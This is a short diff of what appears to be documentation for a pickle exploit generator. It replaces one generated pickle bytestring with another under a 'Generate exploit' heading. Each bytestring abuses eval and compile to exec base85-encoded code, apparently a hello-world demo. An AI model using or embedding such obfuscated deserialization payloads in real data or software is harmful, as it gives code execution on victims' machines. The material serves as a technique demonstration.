@@ -11,7 +11,7 @@ print('Hello world!')
 Generate exploit:
 ```
 Python script filename>HelloWorld.py
-b'c__builtin__\neval\n(c__builtin__\ncompile\n(Vfrom base64 import b85decode;from zlib import decompress;exec(decompress(b85decode("c$_OJ%FHX#Q1?j9$;nqJ&o9bJQB>FD0svc+2Q&")).decode())\nV-\nVexec\ntRtR.'
+b'c__builtin__\neval\n(c__builtin__\ncompile\n(Vimport base64;exec(base64.b85decode("aB^vGbSNiCWo&G3Aa`$aY-AxPDGC").decode())\nV-\nVexec\ntRtR.'
 ```
 
 Executing:
